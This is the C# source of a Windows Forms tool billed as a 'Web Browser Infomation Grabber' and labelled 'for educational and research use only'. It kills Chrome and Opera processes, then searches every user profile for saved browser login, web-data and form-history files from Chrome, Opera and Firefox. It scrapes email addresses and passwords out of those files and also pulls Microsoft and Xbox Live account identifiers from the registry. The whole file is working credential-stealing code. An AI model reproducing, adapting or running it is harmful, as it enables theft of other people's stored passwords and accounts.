using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;

namespace NHA_Browser_Info_Passing{
public partial class BrowserInfPassing : Form{
public BrowserInfPassing(){
InitializeComponent();
}

private void GetPasswordsFromChrome_Click(object sender, EventArgs e){
PrepAndDestroy();

}

string[] GetEmailAccountsFromRegistry(){
List<string> Keys=new List<string>();
string[] Names=Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\IdentityCRL\UserExtendedProperties").GetSubKeyNames();
Keys.Add("Email Accounts From Registry:");
foreach(string Key in Names){
Keys.Add(" ");
  string cid=(string)Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\IdentityCRL\UserExtendedProperties\" + Key).GetValue("cid");
Keys.Add("Email: "+ Key);
Keys.Add("CID: "+ cid);
}
return Keys.ToArray();
}


string[] GetAllLoginUserEmailAccountsFromRegistry(){
List<string> Keys=new List<string>();
string[] Names=Registry.Users.OpenSubKey(@".DEFAULT\Software\Microsoft\IdentityCRL\StoredIdentities").GetSubKeyNames();
Keys.Add("Login Email Accounts From Registry:");
foreach(string Key in Names){
Keys.Add(" ");
  string cid=(string)Registry.Users.OpenSubKey(@".DEFAULT\Software\Microsoft\IdentityCRL\StoredIdentities\" + Key).GetValue("CID");
Keys.Add("Email: "+ Key);
Keys.Add("CID: "+ cid);
}
return Keys.ToArray();
}


string[] GetCurrentUserXBLAccountFromRegistry(){
string Keyout(string kei) {return (string)Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\XboxLive").GetValue(kei); }
List<string> Keys=new List<string>();
string[] Names=Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\XboxLive").GetSubKeyNames();
Keys.Add("User XBL Account From Registry:");
Keys.Add(" ");
Keys.Add("Email: "+ Keyout("UserName"));
Keys.Add("Gamertag: " + Keyout("Gamertag"));
Keys.Add("XUID: " + Keyout("Xuid"));
Keys.Add("AccountId: " + Keyout("AccountId"));
Keys.Add("Age Group: " + Keyout("AgeGroup"));
return Keys.ToArray();
}

void PrepAndDestroy(){
string[] ProcsToKill = "chrome~opera".Split('~');
KillProcessesByName(ProcsToKill);
for (;;){
if (Process.GetProcessesByName("chrome").Length <= 1 && Process.GetProcessesByName("opera").Length <= 1){
DoAccountFinding(); break;
}
}
}

void KillProcessesByName(object procname){
if(procname.GetType().ToString()=="System.String"){
foreach (Process PROC in Process.GetProcessesByName((string)procname)){
PROC.Kill();
}
}else if (procname.GetType().ToString()=="System.String[]"){
string[] prox = (string[])procname;
foreach(string proxn in prox){
foreach (Process PROC in Process.GetProcessesByName(proxn)){
PROC.Kill();
}
}
}
}


string[] GetUserPaths(){
List<string> paths = new List<string>();
foreach (string drive in Directory.GetLogicalDrives()){
if (Directory.Exists(drive+"Users")){
string path = drive + "Users";
string[] UserFolders = Directory.GetDirectories(path);
foreach(string User in UserFolders){
string UserName= User.Split('\\')[User.Split('\\').Length - 1];
if (Directory.Exists(User+"\\AppData")&&Directory.Exists(User+"\\Start Menu")&& UserName != "Default"&& UserName!="Default User"){
paths.Add(User);
}}
}
}
return paths.ToArray();
}

List<string> BrowsersWithValidData =new List<string>();

List<string> BrowserDirFromUser(string user){


return new List<string>(){
user+@"\AppData\Local\Google\Chrome\User Data\Default",
user+@"\AppData\Roaming\Opera Software\Opera Stable",
user+ @"\AppData\Roaming\Opera Software\Opera GX Stable",
GetBiggestFldr(user+ @"\AppData\Roaming\Mozilla\Firefox\Profiles")
};
}

List<string> FindCromeLocos(){
List<string> Output=new List<string>();
foreach(string user in GetUserPaths()){
foreach(string loco in BrowserDirFromUser(user)){
Output=FindAndOutputDump(Output, loco);
}

}



return Output;
}

string GetBiggestFldr(string userfldr){
string chosen="";
if(Directory.Exists(userfldr)){
string[] dirs = Directory.GetDirectories(userfldr);
int size=0;
foreach(string dir in  dirs){
int sz=Directory.GetDirectories(dir).Length;
if(size<sz){
size=Directory.GetDirectories(dir).Length;
chosen=dir;
}
}
}
return chosen;
}

List<string> FindAndOutputDump(List<string> Intput,string TERERERER){
List<string> Output=new List<string>(Intput);
            if(Directory.Exists(TERERERER)){
                if (File.Exists(TERERERER + "\\Web Data")){
                    Output.Add(TERERERER + "\\Web Data");
                }
                if (File.Exists(TERERERER + "\\Login Data")){
                    Output.Add(TERERERER + "\\Login Data");
                }
                if (File.Exists(TERERERER + "\\formhistory.sqlite")){
                    Output.Add(TERERERER + "\\formhistory.sqlite");
                }
                
            }
            return Output;
        }


string RepAllIfThere(string inputs,string whatto,string repwith) { string outs = inputs; if (outs.Contains(whatto)) { outs = outs.Replace(whatto, repwith); } return outs; }


List<string> countrycodes = new List<string>() {
"uk",
"au",
"us",
"co",
"nz"};
List<string> RetrieveDomains(){
List<string> Domains = new List<string>();
foreach(string EmailDomain in DomainList.EmailDomains){
Domains.Add(EmailDomain);
foreach(string countrycode in countrycodes){
Domains.Add(EmailDomain+"."+ countrycode);
}
}
return Domains;
}

string SplitAssistFromMailDomail(string cleaned){
string Reti=cleaned;
foreach(string domain in RetrieveDomains()){
if(cleaned.Split('@')[1].StartsWith(domain)){
Reti= cleaned.Split('@')[0]+"@"+domain;
}
}
return Reti;
}

string CleanDoublePasswordThing(string passin){string passout=passin;
string[] passinf = passout.Split();
bool ispossible=true;

var value = passout;
var firstHalfLength = (int)(value.Length / 2);
var secondHalfLength = value.Length - firstHalfLength;
var splitVals = new[] {
value.Substring(0, firstHalfLength),
value.Substring(firstHalfLength, secondHalfLength)
};

string possbuild = splitVals[0];
string possbuild2 = splitVals[1];
if(possbuild.ToLower()!=possbuild2.ToLower()){
ispossible=false;
}

if(ispossible){
passout=possbuild+"     Or     "+possbuild2;
}

return passout;
}


List<List<string>> EmailAndPasswordParser(List<string> CromeLocos){
List<string>  TempEmail=new List<string>();
List<string>  TempPass=new List<string>();
foreach (string TooReed in CromeLocos) {
string Read=File.ReadAllText(TooReed);
if(Read.Contains("{")){Read=Read.Replace("{","");}
if(Read.Contains("}")){Read=Read.Replace("}","");}
Read= RepAllIfThere(Read,"{", "");
Read= RepAllIfThere(Read,"}", "");
Read= RepAllIfThere(Read,")", "");
Read = RepAllIfThere(Read,"-login", ")");
Read = RepAllIfThere(Read,"emailconfirm", ")");
Read= RepAllIfThere(Read,"email-input", ")");
Read= RepAllIfThere(Read,"email-addy", ")");
Read= RepAllIfThere(Read,"emailinput", ")");
Read= RepAllIfThere(Read,"emailaddy", ")");
Read = RepAllIfThere(Read, "login", ")");
Read= RepAllIfThere(Read, "email",")");

if(Read.Contains("PasswordText")){
Read=Read.Replace("PasswordText","{");
string[] PassStore = Read.Split('{');
for(var i=1;i < PassStore.Length;i++){string Pass=PassStore[i];
string cleaned= Pass.Split(CharWhereToSplit(Pass))[0];
if(cleaned!=""&&cleaned.Length>1){
cleaned=CleanDoublePasswordThing(cleaned);
if(!TempPass.Contains(cleaned)){
TempPass.Add(cleaned);
}
}}

}



if(Read.Contains(")")){
string[] MailStore = Read.Split(')');
for(var i=1;i < MailStore.Length;i++){string Mail= MailStore[i];
string cleaned= Mail.Split(CharWhereToSplitEmail(Mail))[0];
if(cleaned!=""&&cleaned.Length>1&&cleaned.Contains("@")){
char lastchar = cleaned.ToLower().Last();
if(lastchar!='o'&&lastchar!='m'&&lastchar!='k'){ 
cleaned = cleaned.TrimEnd(lastchar);
}
string meil=cleaned;
meil= SplitAssistFromMailDomail(cleaned.ToLower());
if (!TempEmail.Contains(meil.ToLower())){
TempEmail.Add(meil.ToLower());
}
}}
}
}


List<List<string>> Packed =new List<List<string>>() { TempEmail, TempPass };
return Packed;
}

List<string> AccountFillFromEmailAndPasswordDump(List<string> Emails ,List<string> Passwords){
List<string> AccountInfo = new List<string>();
AccountInfo.Add("");
if(Emails.ToArray().Length>0){
AccountInfo.Add("Emails: ");
AccountInfo=AddStringArrayToListString(AccountInfo, Emails.ToArray());
}else{
AccountInfo.Add("Browser Contains No Emails!");
}

AccountInfo.Add("");
if(Passwords.ToArray().Length>0){
AccountInfo.Add("Passwords: ");
AccountInfo=AddStringArrayToListString(AccountInfo,Passwords.ToArray());
}else{
AccountInfo.Add("Browser Contains No Passwords!");
}
return AccountInfo;
}

List<string> AddStringArrayToListString(List<string> InList,string[] InArray){
List<string> OutList=InList;
foreach(string info in InArray){
OutList.Add(info);
}
return OutList;
}
        
void DoAccountFinding(){
List<string> _Dmp=new List<string>();
foreach(string browser in FindCromeLocos()){
List<string> CromeLocos=new List<string>() { browser};
List<List<string>> Passing = EmailAndPasswordParser(CromeLocos);
List<string> Emails=new List<string>(Passing[0]);
List<string> Passwords=new List<string>(Passing[1]);
List<string> AccountInfo = AccountFillFromEmailAndPasswordDump(Emails, Passwords);
List<string> Browsah = new List<string>(browser.Split('\\'));
string[] Browsahi = Browsah.ToArray();
List<string> Browsahl =new List<string>();
foreach (string Browsax in Browsah){
Browsahl.Add(Browsax.ToLower());
}


if (Emails.Count>=1||Passwords.Count>=1){

                    
_Dmp=BrowserInfLog(_Dmp, Browsah, Browsahl);
foreach (string accountinf in AccountInfo){
_Dmp.Add(accountinf);
}
_Dmp= BrowserBottomLog(_Dmp);
}else{
_Dmp=BrowserInfLog(_Dmp, Browsah, Browsahl);
_Dmp.Add(" ");
_Dmp.Add("Browser Contains No User Infomation!");
_Dmp= BrowserBottomLog(_Dmp);
}


}
InfoBox.Lines= _Dmp.ToArray();
}

string BigAssStars= "#*************************************************************#";

List<string> BrowserInfLog(List<string> _Dmpin, List<string> Browsah, List<string> Browsahl){
List<string> _Dmp=new List<string>(_Dmpin);
_Dmp.Add(" ");
//_Dmp.Add(BigAssStars);
_Dmp.Add(" ");
_Dmp.Add("User Browser Infomation For: ");
_Dmp.Add("User Account: "+Browsah[Browsahl.IndexOf("users")+1]+"");
string browserauth= FirstLetterToUpper(Browsah[Browsahl.IndexOf("appdata") + 2]);
string browserbuild=FirstLetterToUpper(Browsahl[Browsahl.IndexOf("appdata") +3]);
_Dmp.Add("Browser: "+ browserauth+" "+ browserbuild+"");
return _Dmp;
}
List<string> BrowserBottomLog(List<string> _Dmpin){
List<string> _Dmp=new List<string>(_Dmpin);
_Dmp.Add(" ");
_Dmp.Add(BigAssStars);
_Dmp.Add(" ");
return _Dmp;
}


public string FirstLetterToUpper(string str){
    if (str == null) {return null;}
    
    if (str.Length > 1)
    if(!str.Contains(" ")){
     return char.ToUpper(str[0]) + str.Substring(1);
    }else{
    string builder="";
    foreach (string section in str.Split(' ')){
     builder=builder+FirstLetterToUpper(section)+" ";
    }
    return builder.TrimEnd(' ');
    }
    return str.ToUpper();
}



char CharWhereToSplit(string inputstring){ char rety = '~';
string lettice = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890";
for(var i=0;i<inputstring.Length;i++){
if(!lettice.Contains(inputstring[i])){
rety=inputstring[i];
break;
}
}
return rety;
}

char CharWhereToSplitEmail(string inputstring){ char rety = '~';
string lettice = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890@.-";
for(var i=0;i<inputstring.Length;i++){
if(!lettice.Contains(inputstring[i])){
rety=inputstring[i];
break;
}
}
return rety;
}



private void UserInfoPassing_Load(object sender, EventArgs e){
List<string> TextS = new List<string>() {"",
"{TESTING} Web Browser Infomation Grabber",
"                 Grabber Version: 1.1",
"               ~  Made By: dr NHA  ~",
"   For Educational And Research Use Only!","","Disclaimer:",
"               All Code Is Strictly Prohibited From Malware Use!",
"Credits Have To Be Given To The Creator If Anything Is Used In Any Way!" };
InfoBox.Lines= TextS.ToArray();
KnownDomains.Lines=RetrieveDomains().ToArray();
}

private void GetUserXBL_Click(object sender, EventArgs e){
InfoBox.Lines=GetCurrentUserXBLAccountFromRegistry();
}
private void GetUserEmailStoreFromRegistry_Click(object sender, EventArgs e){
List<string> GDB=new List<string>(GetEmailAccountsFromRegistry());
GDB.Add("");
GDB.Add("");
foreach(string logaccs in GetAllLoginUserEmailAccountsFromRegistry()){
GDB.Add(logaccs);
}
InfoBox.Lines=GDB.ToArray();
}


    }
}
